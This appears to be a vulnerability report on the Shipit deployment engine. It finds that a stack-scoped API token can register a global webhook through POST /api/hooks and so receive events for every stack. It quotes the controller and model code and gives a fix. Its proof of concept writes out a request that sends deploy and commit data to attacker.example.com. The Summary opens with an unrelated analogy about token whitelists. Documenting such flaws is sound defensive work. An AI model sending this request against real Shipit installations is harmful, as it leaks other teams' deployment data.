### Title
Stack-scoped ApiClient can register a global Hook, exfiltrating deploy/task/commit-status events for every stack it does not authorize - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
The reported bug class is a broken binding between an authorized scope and the entity that state actually applies to (`allWhitelistedTokens` array not reflecting the true whitelist, causing `getAum` to act on stale/duplicated entries). The direct analog in this engine is `Shipit::Api::HooksController`, where the scope used for permission checking (`write:hook`/`read:hook`) is decoupled from the `stack_id` the `ApiClient` token is actually bound to, letting a single-stack-scoped token create a `Hook` resource that is **not** scoped to that stack and therefore receives events for **every** stack in the installation.

### Finding Description
`ApiClient#check_permissions!` only verifies that the requested `operation:scope` string (e.g. `write:hook`) is present in the client's `permissions` array [1](#0-0) . It never consults `current_api_client.stack_id`, unlike the `stacks`/`stack` helpers in `Shipit::Api::BaseController`, which correctly restrict a scoped client to its own `Stack` record [2](#0-1) .

`config/routes.rb` exposes `Hook` CRUD both nested under a stack (`/api/stacks/*stack_id/hooks`) and at the top level, unscoped (`/api/hooks`), both routed to the same `HooksController` [3](#0-2) .

In `HooksController`, the scope used to build/find hooks is derived purely from the presence of a `stack_id` **URL parameter**, not from the api client's own stack binding:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [4](#0-3) 

If a client hits the unscoped route (`POST /api/hooks`), `params[:stack_id]` is absent, so `stack_id` is `nil`, and `hooks.create(params)` creates a `Hook` with `stack_id: nil` — a **global** hook [5](#0-4) .

`Hook.deliver` fans events out using `for_stack(stack_id)`, which explicitly includes hooks where `stack_id` is `nil` regardless of which stack emitted the event:
```ruby
scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }
...
def deliver(event, stack_id, payload)
  for_stack(stack_id).listening_event(event).each { |hook| hook.deliver!(event, payload) }
end
``` [6](#0-5) 

`Hook.emit` is invoked from stack/task/deploy/commit/pull_request/merge_request lifecycle code for every stack in the Shipit instance, each time enqueuing delivery to every global hook [7](#0-6) .

Binding broken (equality that should hold but doesn't):
`stack a token authorises == stack the created resource (Hook) is scoped to`

Before the attacker's request: a client is provisioned with `stack_id = A` and permission `write:hook`, intended to let it manage hooks for stack A only (as enforced correctly for `/api/stacks/*id`, `tasks`, `deploys`, etc. via `BaseController#stacks`/`#stack`).
After the attacker's request to `POST /api/hooks` (no `stack_id` param): a `Hook` row with `stack_id: nil` exists, which `Hook.deliver` treats as applicable to **every** stack (`where(stack_id: [nil, stack_id])`), breaking the intended one-to-one mapping between the token's authorized stack and the stacks whose events it can observe.

### Impact Explanation
Any `ApiClient` scoped to a single stack but granted `write:hook` (a permission plausibly granted to let integrations register their own delivery webhook) can silently subscribe to `stack`, `deploy`, `rollback`, `task`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, and `pull_request` events for every other stack/repository hosted by the same Shipit instance, and have that data POSTed to an attacker-controlled URL indefinitely. This is an authorization-scope escalation: an entity with credentials limited to one stack gains ongoing read access to state, deploy/task lifecycle data, and commit statuses of other teams'/repositories' stacks it was never granted `read:stack` on — matching the "High: escalation into `Shipit.github_teams` authorization... unauthenticated read of stack state, task streams or deploy output" class of impact in a multi-tenant Shipit deployment.

### Likelihood Explanation
Requires only an already-issued `ApiClient` credential that includes `write:hook` and is stack-scoped — a normal, unprivileged-by-design credential type in Shipit's multi-tenant model (many api clients are provisioned per-team/per-stack). No cross-repo write access, GitHub credentials, or session is needed; the attacker simply calls the documented `POST /api/hooks` endpoint instead of the nested `/api/stacks/*/hooks` one. This is straightforward to exploit for anyone holding such a token.

### Recommendation
Scope hook creation/read/update/destroy to the token's own binding rather than to the URL parameter alone: when `current_api_client.stack_id` is present, force `hooks` to `Hook.scoped_to(current_api_client.stack)` (reject/ignore attempts to create global hooks), and only allow creation of global (`stack_id: nil`) hooks for unscoped ("global") api clients. Concretely, `HooksController#stack_id` should be derived from `current_api_client.stack_id || (stack.id if params[:stack_id].present?)`, and `create` should raise `InsufficientPermission` if a stack-scoped client attempts to create a hook without a matching `stack_id`.

### Proof of Concept
1. Admin provisions an `ApiClient` scoped to stack `myorg/app-a/production` (`stack_id` set) with permissions `['write:hook']` (a plausible grant so the integration can register its own webhook for stack A).
2. Attacker (holder of this token) sends:
   ```
   POST /api/hooks
   Authorization: Basic base64(client_id--token)
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","task","commit_status","pull_request"] }
   ```
   Because the URL has no `stack_id`, `HooksController#stack_id` returns `nil`, and `Hook.where(stack_id: nil).create(...)` succeeds — no `InsufficientPermission` is raised since `write:hook` is present in the token's permissions.
3. From then on, every deploy/task/commit-status/pull-request event for **all** stacks in the Shipit instance (not just stack A) is delivered via `Hook.deliver`'s `for_stack` scope (`where(stack_id: [nil, stack_id])`) to `https://attacker.example.com/collect`, leaking deploy status and task lifecycle data belonging to repositories/stacks the token was never authorized to read.
